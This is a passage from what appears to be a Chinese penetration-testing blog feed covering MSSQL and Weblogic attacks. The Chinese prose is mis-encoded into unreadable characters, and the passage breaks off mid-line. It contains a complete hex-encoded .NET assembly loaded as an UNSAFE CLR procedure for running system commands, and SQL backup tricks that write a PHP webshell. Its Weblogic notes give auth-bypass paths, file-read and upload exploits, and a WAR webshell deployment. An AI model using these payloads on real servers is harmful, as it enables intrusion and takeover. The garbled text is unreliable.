title="CLRåŠŸèƒ½"></a>CLRåŠŸèƒ½</h3><blockquote><p>CLRï¼ˆå…¬å…±è¯­è¨€è¿è¡Œæ—¶ï¼‰æä¾›äº† .NET Framework çš„ä»£ç æ‰§è¡Œç¯å¢ƒï¼Œå¯ä»¥é€šè¿‡ .NET Framework æ¥ç¼–å†™å­˜å‚¨è¿‡ç¨‹ã€è§¦å‘å™¨ç­‰åŠŸèƒ½ ã€‚ç®€å•è¯´ï¼Œé€šè¿‡ CLR èƒ½å¤Ÿåœ¨ <a href="https://cloud.tencent.com/product/sqlserver?from=20065&from_column=20065">SQLServer</a> ä¸­æ³¨å†Œä¸€å¥—ç¨‹åºé›†ï¼Œå®ç°æ‰§è¡Œä»»æ„çš„ .NET ä»£ç ã€‚æ—¢ç„¶å¯ä»¥æ‰§è¡Œä»£ç ï¼Œæ­¤æ—¶å°±å¯ä»¥å®ç°å¾ˆå¤šåŠŸèƒ½ã€‚</p></blockquote><p>ä½¿ç”¨ï¼š<a href="https://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--å¯ç”¨MSSQL CLRåŠŸèƒ½</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">Exec sp_configure &#x27;clr enabled&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"> </span><br><span class="line">--ä¸ºäº†å¯¼å…¥äº†ä¸å®‰å…¨çš„ç¨‹åºé›†ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†æ•°æ®åº“æ ‡è®°ä¸ºå®‰å…¨ã€‚</span><br><span class="line">ALTER DATABASE [master] SET TRUSTWORTHY ON;</span><br><span class="line"> </span><br><span class="line">--å¯¼å…¥ç¨‹åºé›†ï¼Œå•ç‹¬æ‰§è¡Œ</span><br><span class="line">CREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c0103006643f55f0000000000000000e00022200b013000000e00000006000000000000022d0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000b02c00004f00000000400000b803000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000080d000000200000000e000000020000000000000000000000000000200000602e72737263000000b8030000004000000004000000100000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000e42c00000000000048000000020005005c220000540a00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be280e00000a72010000706f0f00000a280e00000a7243000070725300007002281000000a28020000066f0f00000a2a1b300600a40100000100001173040000060a731100000a0b076f1200000a026f1300000a03281400000a2d0c076f1200000a036f1500000a076f1200000a176f1600000a076f1200000a176f1700000a076f1200000a166f1800000a076f1200000a176f1900000a076f1200000a176f1a00000a06731b00000a7d010000040706fe0605000006731c00000a6f1d00000a140c076f1e00000a26076f1f00000a076f2000000a6f2100000a0c076f2200000ade390d280e00000a1b8d160000012516725d000070a2251702a2251803a225197291000070a2251a096f2300000aa2282400000a6f0f00000ade00076f2500000a2d1a280e00000a067b010000046f2600000a6f0f00000a3895000000731b00000a130408281400000a2d091104086f2700000a26067b010000046f2800000a2c20110472970000706f2700000a261104067b010000046f2600000a6f2700000a26280e00000a1c8d16000001251602a2251703a2251872af000070a22519076f2500000a13051205282900000aa2251a7291000070a2251b1104252d0426142b056f2600000aa2282400000a6f0f00000a067b010000046f2600000a2a011000000000870021a80039100000011e02282a00000a2a4e027b01000004046f2b00000a6f2700000a262a42534a4201000100000000000c00000076322e302e35303732370000000005006c00000038030000237e0000a4030000a804000023537472696e6773000000004c080000e80000002355530034090000100000002347554944000000440900001001000023426c6f620000000000000002000001571502000902000000fa013300160000010000001c000000030000000100000005000000050000002b0000000d000000010000000100000003000000010000000000b1020100000000000600ed01ae0306005a02ae03060038019b030f00ce03000006004c01cd020600d001cd020600b101cd0206004102cd0206000d02cd0206002602cd0206007901cd0206009401cd0206003004c6020a0063014e030e0009049b030600df02c602060020036e0406001d01ae030e00ee039b030a007a044e030a0015014e0306008e02c6020e00f7029b030e00c4009b030e0035039b0306000803360006001503360006002700c602000000002d00000000000100010001001000dd030000350001000100030110000100000035000100040006006404740050200000000096005e007800010080200000000096008b001a00020040220000000086189503060004004022000000008618950306000400482200000000830016007d000400000001007d0000000100e400000002001f04000001002e03000002000404090095030100110095030600190095030a00290095031000310095031000390095031000410095031000490095031000510095031000590095031000610095031000710095030600910095030600a1000c011500a90096001000b10029041a007900950306007900e9022d00b900d7001000b10098043200b90011041000b90085043700b900b4003c00b90078023700b9007b033700b90049043700890095030600c90095034200790066004800790043044e007900ed000600790069035200d900810057007900370406008100a8005700b10029045b0079009b00610069008c025700890001016500890095026100e1008c02570069009503060099004c005700200063000b012e000b0084002e0013008d002e001b00ac002e002300b5002e002b00cb002e003300cb002e003b00cb002e004300d1002e004b00e1002e005300cb002e005b00fe0063006b000b012000048000000100000000000000000000000000a00200000200000000000000000000006b005500000000000200000000000000000000006b004000000000000200000000000000000000006b00c60200000000030002000000003c3e635f5f446973706c6179436c617373315f30003c52756e436f6d6d616e643e625f5f3000496e743332003c4d6f64756c653e0053797374656d2e494f0053797374656d2e44617461006765745f44617461006d73636f726c696200436d6445786563006164645f4f757470757444617461526563656976656400636d640052656164546f456e640052756e436f6d6d616e640053656e64006765745f45786974436f6465006765745f4d657373616765007365745f57696e646f775374796c650050726f6365737357696e646f775374796c65007365745f46696c654e616d650066696c656e616d6500426567696e4f7574707574526561644c696e6500417070656e644c696e65006765745f506970650053716c5069706500436f6d70696c657247656e6572617465644174747269627574650044656275676761626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c4578656375746500546f537472696e67006765745f4c656e6774680057617253514c4b69744d696e696d616c0057617253514c4b69744d696e696d616c2e646c6c0053797374656d0053797374656d2e5265666c656374696f6e00457863657074696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d526561646572005465787452656164657200537472696e674275696c6465720073656e646572004461746152656365697665644576656e7448616e646c6572004d6963726f736f66742e53716c5365727665722e536572766572006765745f5374616e646172644572726f72007365745f52656469726563745374616e646172644572726f72002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053746f72656450726f63656475726573004461746152656365697665644576656e744172677300617267730050726f63657373007365745f417267756d656e747300617267756d656e747300436f6e636174004f626a6563740057616974466f7245786974005374617274007365745f52656469726563745374616e646172644f7574707574007374644f75747075740053797374656d2e546578740053716c436f6e74657874007365745f4372656174654e6f57696e646f770049734e756c6c4f72456d707479000000004143006f006d006d0061006e0064002000690073002000720075006e006e0069006e0067002c00200070006c006500610073006500200077006100690074002e00000f63006d0064002e00650078006500000920002f006300200000334f00530020006500720072006f00720020007700680069006c006500200065007800650063007500740069006e006700200000053a002000001753007400640020006f00750074007000750074003a0000372000660069006e00690073006800650064002000770069007400680020006500780069007400200063006f006400650020003d0020000000c1b0e79eb8eb6348be1e0c1d83c2d05800042001010803200001052001011111042001010e04000012550500020e0e0e0c0706120c123d0e1241124508042000125d040001020e0420010102052001011161052002011c180520010112650320000204200012690320000e0500010e1d0e0320000805200112450e08b77a5c561934e08903061245040001010e062002011c124d0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001501001057617253514c4b69744d696e696d616c00000501000000000f01000a457975702043454c494b00001c010017687474703a2f2f6579757063656c696b2e636f6d2e747200000c010007312e302e302e3000000401000000d82c00000000000000000000f22c0000002000000000000000000000000000000000000000000000e42c0000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005c03000000000000000000005c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc020000010053007400720069006e006700460069006c00650049006e0066006f0000009802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004a0011000100460069006c0065004400650073006300720069007000740069006f006e0000000000570061007200530051004c004b00690074004d0069006e0069006d0061006c0000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004a001500010049006e007400650072006e0061006c004e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c00000000005400180001004c006500670061006c0043006f007000790072006900670068007400000068007400740070003a002f002f006500790075007000630065006c0069006b002e0063006f006d002e007400720000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005200150001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c000000000036000b000100500072006f0064007500630074004e0061006d0065000000000045007900750070002000430045004c0049004b0000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000043d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">--åˆ›å»ºå­˜å‚¨è¿‡ç¨‹,å•ç‹¬æ‰§è¡Œ</span><br><span class="line">CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec;</span><br><span class="line">--æ‰§è¡Œå‘½ä»¤</span><br><span class="line">EXEC sp_cmdExec &#x27;whoami&#x27;;</span><br><span class="line">--åˆ é™¤è¯¥ç¨‹åºé›†</span><br><span class="line">DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit];</span><br></pre></td></tr></table></figure><h2 id="db-owneræƒé™"><a href="#db-owneræƒé™" class="headerlink" title="db_owneræƒé™"></a>db_owneræƒé™</h2><h3 id="LOGå¤‡ä»½"><a href="#LOGå¤‡ä»½" class="headerlink" title="LOGå¤‡ä»½"></a>LOGå¤‡ä»½</h3><ul><li>å­˜åœ¨æ•°æ®åº“å¤‡ä»½æ–‡ä»¶</li><li>ç½‘ç«™çš„ç»å¯¹è·¯å¾„</li><li>å †å æ³¨å…¥</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter database æ•°æ®åº“å set RECOVERY FULL;   --ä¿®æ”¹æ•°æ®åº“æ¢å¤æ¨¡å¼ä¸º å®Œæ•´æ¨¡å¼</span><br><span class="line">create table cmd (a image);        --åˆ›å»ºä¸€å¼ è¡¨cmdï¼Œåªæœ‰ä¸€ä¸ªåˆ— aï¼Œç±»å‹ä¸ºimage</span><br><span class="line">backup log æ•°æ®åº“å to disk= &#x27;C:\phpstudy\WWW\1.php&#x27; with init;   --å¤‡ä»½è¡¨åˆ°æŒ‡å®šè·¯å¾„</span><br><span class="line">insert into cmd (a) values(æœ¨é©¬åå…­è¿›åˆ¶);  --æ’å…¥ä¸€å¥è¯åˆ°cmdè¡¨é‡Œ</span><br><span class="line">backup log æ•°æ®åº“å to disk=&#x27;C:\phpstudy\WWW\2.php&#x27;;   --æŠŠæ“ä½œæ—¥å¿—å¤‡ä»½åˆ°æŒ‡å®šæ–‡ä»¶</span><br><span class="line">drop table cmd;    --åˆ é™¤cmdè¡¨</span><br></pre></td></tr></table></figure><p><code>2.php</code>ä¸ºæœ¨é©¬æ–‡ä»¶</p><h3 id="å·®å¼‚å¤‡ä»½"><a href="#å·®å¼‚å¤‡ä»½" class="headerlink" title="å·®å¼‚å¤‡ä»½"></a>å·®å¼‚å¤‡ä»½</h3><blockquote><p>æ³¨ï¼šå·®å¼‚å¤‡ä»½æœ‰æ¦‚ç‡ä¼šæŠŠç½‘ç«™æå´©ï¼Œæ‰€ä»¥ä¸å»ºè®®ä½¿ç”¨å·®å¼‚å¤‡ä»½</p></blockquote><ul><li>ç½‘ç«™çš„ç»å¯¹è·¯å¾„</li><li>å †å æ³¨å…¥</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table [dbo].[test] ([cmd] [image])</span><br><span class="line"></span><br><span class="line">declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x6b 68617a backup log @a to disk = @s with init,no_truncate</span><br><span class="line"></span><br><span class="line">insert into [test](cmd) values(æœ¨é©¬åå…­è¿›åˆ¶)</span><br><span class="line"></span><br><span class="line">declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=ç»å¯¹è·¯å¾„åå…­è¿›åˆ¶ backup log @a to disk=@s with init,no_truncate</span><br><span class="line"></span><br><span class="line">Drop table [test]</span><br></pre></td></tr></table></figure><h1 id="è¡¥å……â€“å¾…å­¦ä¹ "><a href="#è¡¥å……â€“å¾…å­¦ä¹ " class="headerlink" title="è¡¥å……â€“å¾…å­¦ä¹ "></a>è¡¥å……â€“å¾…å­¦ä¹ </h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MSSQL 2017--Pythonå’ŒRè„šæœ¬</span><br><span class="line">æ²™ç›’å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">Agent Jobå‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/7534#toc-17">https://xz.aliyun.com/t/7534#toc-17</a></p><p><a href="https://xz.aliyun.com/t/8603">MSSQL GetShellæ–¹æ³• - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://tttang.com/archive/1545/">mssql ææƒæ€»ç»“ - è·³è·³ç³– (tttang.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Weblogicæ¼æ´</title>
      <link href="/2023/05/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BWeblogic/"/>
      <url>/2023/05/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BWeblogic/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/xublog/article/details/45395587">Weblogicæ§åˆ¶å°ä¸­æ–‡æ˜¾ç¤ºè¿˜æ˜¯è‹±æ–‡æ˜¾ç¤ºï¼Œæµè§ˆå™¨è¯­è¨€è®¾ç½®å†³å®šçš„_sxuskyçš„åšå®¢-CSDNåšå®¢</a></p><h1 id="ç‰¹å¾"><a href="#ç‰¹å¾" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h1><p><img src="/../images/image-20230819124339256.png" alt="image-20230819124339256"></p><p>ç¬¬ä¸€æ¬¡è®¿é—®è·¯å¾„</p><p><img src="/../images/image-20230819131045739.png" alt="image-20230819131045739"></p><p>&#x2F;console ç®¡ç†å°é¡µé¢å’Œç‰ˆæœ¬</p><p><img src="/../images/image-20230819150256846.png" alt="image-20230819150256846"></p><h1 id="ç‰ˆæœ¬å·åˆ¤æ–­"><a href="#ç‰ˆæœ¬å·åˆ¤æ–­" class="headerlink" title="ç‰ˆæœ¬å·åˆ¤æ–­"></a>ç‰ˆæœ¬å·åˆ¤æ–­</h1><p><img src="/../images/image-20230919094414813.png" alt="image-20230919094414813"></p><p><a href="https://mp.weixin.qq.com/s/z6q1sBYcHYgzvak98QQmeA">ç¬¬21ç¯‡ï¼šåˆ¤æ–­Weblogicè¯¦ç»†ç‰ˆæœ¬å·çš„æ–¹æ³•æ€»ç»“ (qq.com)</a></p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><blockquote><p>Weblogicæ´å®åœ¨å¤ªå¤šäº†ã€‚ã€‚</p></blockquote><h2 id="é…åˆæ–‡ä»¶è¯»å–æ¥è¯»å–ç®¡ç†å‘˜è´¦å¯†"><a href="#é…åˆæ–‡ä»¶è¯»å–æ¥è¯»å–ç®¡ç†å‘˜è´¦å¯†" class="headerlink" title="é…åˆæ–‡ä»¶è¯»å–æ¥è¯»å–ç®¡ç†å‘˜è´¦å¯†"></a>é…åˆæ–‡ä»¶è¯»å–æ¥è¯»å–ç®¡ç†å‘˜è´¦å¯†</h2><p>config.xmlï¼šæœç´¢<code>&lt;node-manager-password-encrypted&gt;</code></p><p><img src="/../images/image-20230819133229460.png" alt="image-20230819133229460"></p><p>å¯†ç è§£å¯†</p><ul><li>å¯†é’¥ï¼šSerializedSystemIni.datï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½¿ç”¨burpä¿å­˜ï¼‰</li><li>è§£å¯†</li></ul><h2 id="è¿›å…¥ç®¡ç†ç•Œé¢éƒ¨ç½²waråŒ…"><a href="#è¿›å…¥ç®¡ç†ç•Œé¢éƒ¨ç½²waråŒ…" class="headerlink" title="è¿›å…¥ç®¡ç†ç•Œé¢éƒ¨ç½²waråŒ…"></a>è¿›å…¥ç®¡ç†ç•Œé¢éƒ¨ç½²waråŒ…</h2><p><img src="/../images/image-20231015112007348.png" alt="image-20231015112007348"></p><p><img src="/../images/image-20231015111953607.png" alt="image-20231015111953607"></p><p><img src="/../images/image-20231015112022950.png" alt="image-20231015112022950"></p><p><img src="/../images/image-20231015112051785.png" alt="image-20231015112051785"></p><p><img src="/../images/image-20231015112107839.png" alt="image-20231015112107839"></p><p><img src="/../images/image-20231015112115661.png" alt="image-20231015112115661"></p><p>è®¿é—®<code>shell/shell.jsp</code></p><p><img src="/../images/image-20231015112126198.png" alt="image-20231015112126198"></p><h2 id="æ–‡ä»¶åŒ…å«â€“CVE-2022-21371"><a href="#æ–‡ä»¶åŒ…å«â€“CVE-2022-21371" class="headerlink" title="æ–‡ä»¶åŒ…å«â€“CVE-2022-21371"></a>æ–‡ä»¶åŒ…å«â€“CVE-2022-21371</h2><p>å½±å“ç‰ˆæœ¬ï¼š12.1.3.0.0 &#x2F; 12.2.1.3.0 &#x2F; 12.2.1.4.0 &#x2F; 14.1.1.0.0</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET .//META-INF/MANIFEST.MF</span><br><span class="line">GET .//WEB-INF/web.xml</span><br><span class="line">GET .//WEB-INF/portlet.xml</span><br><span class="line">GET .//WEB-INF/weblogic.xml</span><br></pre></td></tr></table></figure><h2 id="SSRF-CVE-2014-4210"><a href="#SSRF-CVE-2014-4210" class="headerlink" title="SSRF-CVE-2014-4210"></a>SSRF-<strong>CVE-2014-4210</strong></h2><p>æ¼æ´ä½ç½®åœ¨<code>uddiexplorer/SearchPublicRegistries.jsp</code></p><p><img src="/../images/11921423-e5720550a86f7853.png" alt="img"></p><p>æœç´¢<code>An error has occurred</code>å®šä½è¿”å›å€¼</p><p>è®¿é—®å­˜åœ¨çš„ç«¯å£ï¼Œè¿”å›<code>çŠ¶æ€ç </code></p><p><img src="/../images/image-20230819125030914.png" alt="image-20230819125030914"></p><p>è®¿é—®ä¸å­˜åœ¨çš„ç«¯å£ï¼Œè¿”å›<code>could not connect over HTTP to server</code></p><p><img src="/../images/image-20230819124951962.png" alt="image-20230819124951962"></p><p>å¦‚æœè®¿é—®çš„ç«¯å£ä¸æ˜¯httpåè®®ï¼Œåˆ™ä¼šè¿”å›<code>did not have a valid SOAP content-type</code></p><p><strong>æœåŠ¡æ¢æµ‹æ€»ç»“</strong></p><p><img src="/../images/%E5%88%A9%E7%94%A8WebLogic-SSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91Redis%E5%8F%8D%E5%BC%B9shell5.png" alt="img"></p><p><strong>SSRFæ‰“Redis</strong></p><blockquote><p>åœ¨Weblogicçš„SSRFä¸­ï¼Œæœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ç‰¹ç‚¹ï¼Œå°±æ˜¯è™½ç„¶æ˜¯ä¸€ä¸ªâ€œGETâ€è¯·æ±‚ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥%0a%0dæ¥æ³¨å…¥æ¢è¡Œç¬¦ï¼Œè€ŒæŸäº›æœåŠ¡ï¼ˆå¦‚redisï¼‰æ˜¯é€šè¿‡æ¢è¡Œç¬¦æ¥åˆ†éš”æ¯æ¡å‘½ä»¤ï¼Œä¹Ÿå°±è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥SSRFæ”»å‡»å†…ç½‘ä¸­çš„redisæœåŠ¡å™¨ã€‚</p></blockquote><h2 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰"><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰" class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰"></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰</h2><p><a href="https://paper.seebug.org/647">https://paper.seebug.org/647</a></p><p>äº§ç”ŸåŸå› </p><ul><li><p>éœ€è¦çŸ¥é“éƒ¨ç½²åº”ç”¨çš„webç›®å½•</p></li><li><p>å¼€å¯äº†Web Service Test Pageï¼Œå¼€å‘æ¨¡å¼ä¸‹å¯æœªæˆæƒè®¿é—®&#x2F;ws_utc&#x2F;Config.doæˆ–è€…è®¤è¯åè®¿é—®&#x2F;ws_utc&#x2F;begin.do</p></li></ul><p>å¤ç°</p><p>é¦–å…ˆéœ€è¦è®¾ç½®home dirä¸ºé™æ€ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230819140901725.png" alt="image-20230819140901725"></p><ul><li>Config.do</li></ul><p><img src="/../images/image-20230819140918874.png" alt="image-20230819140918874"></p><p>è¿”å›çš„æ•°æ®åŒ…</p><p><img src="/../images/image-20230819141057345.png" alt="image-20230819141057345"></p><p>ä¸Šä¼ åçš„æ–‡ä»¶ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ws_utc/css/config/keystore/[æ—¶é—´æˆ³]_[æ–‡ä»¶å]</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230819141140037.png" alt="image-20230819141140037"></p><ul><li>begin.do</li></ul><p><img src="/../images/image-20230819141750335.png" alt="image-20230819141750335"></p><p><img src="/../images/image-20230819142834936.png" alt="image-20230819142834936"></p><p><img src="/../images/image-20230819143904277.png" alt="image-20230819143904277"></p><p>å°†å‘é€çš„æ—¶é—´æˆ³è¿›è¡Œè½¬æ¢ï¼š2023-08-19 06:27:55.426</p><p>æœåŠ¡å™¨å®é™…ä¸Šçš„</p><p><img src="/../images/image-20230819143328926.png" alt="image-20230819143328926"></p><p>æ‰€ä»¥æ¯«ç§’å¤„éœ€è¦è¿›è¡Œçˆ†ç ´</p><p>ä¸Šä¼ åçš„æ–‡ä»¶ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ws_utc/css/upload/RS_Upload_2023-08-19_06-27-55_[æ¯«ç§’]/import_file_name_[æ–‡ä»¶å]</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230819143749107.png" alt="image-20230819143749107"></p><h2 id="èº«ä»½æ ¡éªŒç»•è¿‡"><a href="#èº«ä»½æ ¡éªŒç»•è¿‡" class="headerlink" title="èº«ä»½æ ¡éªŒç»•è¿‡"></a>èº«ä»½æ ¡éªŒç»•è¿‡</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CVE-2020-14750</span></span><br><span class="line">/console/images/%252E./console.portal</span><br><span class="line">/console/css/%252E./console.portal</span><br><span class="line"></span><br><span class="line"><span class="comment"># CVE-2020-14882</span></span><br><span class="line">/console/css/%252e%252e%252fconsole.portal</span><br><span class="line">/console/images/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure><h2 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h2><p><a href="https://xz.aliyun.com/t/10365">Weblogicæ¼æ´å­¦ä¹ ï¼šT3ååºåˆ—åŒ– - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/10323">Weblogic Xmldecoderååºåˆ—åŒ–ä¸­çš„å‘½ä»¤å›æ˜¾ä¸å†…å­˜é©¬æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><ul><li>ç›´æ¥é€šè¿‡T3åè®®å‘é€æ¶æ„ååºåˆ—åŒ–å¯¹è±¡</li><li>åˆ©ç”¨T3åè®®&#x2F;IIOPåè®®é…åˆRMPæˆ–NDæ¥å£åå‘å‘é€ååºåˆ—åŒ–æ•°æ®</li><li>é€šè¿‡ javabean XMLæ–¹å¼å‘é€ååºåˆ—åŒ–æ•°æ®ã€‚</li></ul><h3 id="T3åè®®æ•°æ®åŒ…"><a href="#T3åè®®æ•°æ®åŒ…" class="headerlink" title="T3åè®®æ•°æ®åŒ…"></a>T3åè®®æ•°æ®åŒ…</h3><blockquote><p>ç¬¬äºŒåˆ°ç¬¬ä¸ƒéƒ¨åˆ†å†…å®¹ï¼Œå¼€å¤´éƒ½æ˜¯<code>ac ed 00 05</code>ï¼Œè¯´æ˜è¿™äº›éƒ½æ˜¯åºåˆ—åŒ–çš„æ•°æ®ã€‚åªè¦æŠŠå…¶ä¸­ä¸€éƒ¨åˆ†æ›¿æ¢æˆæˆ‘ä»¬çš„åºåˆ—åŒ–æ•°æ®å°±å¯ä»¥äº†</p></blockquote><p><img src="/../images/WcnkRK.png" alt="img"></p><p><img src="/../images/WcnYLQ.jpg" alt="img"></p><h3 id="Payloadæ•°æ®åŒ…"><a href="#Payloadæ•°æ®åŒ…" class="headerlink" title="Payloadæ•°æ®åŒ…"></a>Payloadæ•°æ®åŒ…</h3><p><img src="/../images/Wcm5rQ.png" alt="img"></p><h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><h2 id="wafç»•è¿‡"><a href="#wafç»•è¿‡" class="headerlink" title="wafç»•è¿‡"></a>wafç»•è¿‡</h2><p><a href="https://mp.weixin.qq.com/s/8hUYRYoAqjthqgBI_zn9ZA">https://mp.weixin.qq.com/s/8hUYRYoAqjthqgBI_zn9ZA</a></p><p>æ–‡ä»¶åŒ…å«åˆ¤æ–­ç‰ˆæœ¬å·ï¼Ÿ</p><p><img src="/../images/image-20230919095124958.png" alt="image-20230919095124958"></p><p><img src="/../images/image-20230919095037612.png" alt="image-20230919095037612"></p><ul><li><p>weblogic_scanner</p><p>è¿™ä¸ªå·¥å…·ç»å¸¸æç¤ºéœ€è¦è¿›ä¸€æ­¥éªŒè¯çš„ä¸¤ä¸ªæ¼æ´ï¼ˆæ²¡æˆåŠŸè¿‡ã€‚ã€‚ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-2618ï¼šéœ€è¦çŸ¥é“weblogicçš„ç®¡ç†å‘˜è´¦å¯†è¿›è¡Œä»»æ„æ–‡ä»¶ä¸Šæ¬¡ä¸Šä¼ </span><br><span 